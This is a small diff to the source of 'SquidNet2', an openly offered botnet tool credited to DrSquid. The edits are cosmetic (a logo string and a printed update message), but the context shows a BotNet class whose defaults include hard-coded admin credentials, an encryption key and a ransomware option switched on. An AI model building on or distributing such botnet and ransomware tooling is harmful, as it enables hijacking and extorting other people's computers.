@@ -53,8 +53,7 @@ class BotNet:
                                  -__-
                                 /    \\
 Advanced Botnet By DrSquid
-[+] Github: https://github.com/DrSquidX
-        """
+[+] Github: https://github.com/DrSquidX"""
         return logo
     def __init__(self, ip, port, version, external_ip=None, external_port=None, admin_user="admin", admin_pass="adminpassword12345", logfile="log.txt", enc_key=b'iC0g4NM4xy5JrIbRV-8cZSVgFfQioUX8eTVGYRhWlF8=', ftp_dir="Bot_Files", ransomware_active=True):
         """Initiation of the class. Most of every important variable is mentioned here. This function is very important, 
@@ -4536,7 +4535,7 @@ class AutoUpdate:
         except:
             print("[+] There was an error with checking updates, starting SquidNet2.")
         if version > self.version:
-            print(f"[+] Your Version of SquidNet2 is outdated. You have version {self.version}, whereas the current update is version v{version}")
+            print(f"[+] Your Version of SquidNet2 is outdated. You have version {self.version}, whereas the current update is version v{version}.")
             update = input("\n[+] Do you wish to update?(y/n): ").lower()
             if update == "y" or update == "yes":
                 print(f"[+] Updating SquidNet2 to v{version}")
